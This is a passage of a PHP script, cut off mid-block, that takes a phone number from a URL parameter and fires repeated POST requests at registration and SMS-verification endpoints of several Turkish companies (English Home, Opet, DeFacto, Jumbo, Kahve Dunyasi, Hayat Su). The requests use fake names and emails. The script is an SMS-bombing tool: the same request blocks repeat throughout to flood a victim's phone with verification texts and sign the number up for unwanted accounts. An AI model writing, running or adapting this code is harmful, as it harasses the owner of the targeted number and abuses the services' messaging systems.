	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
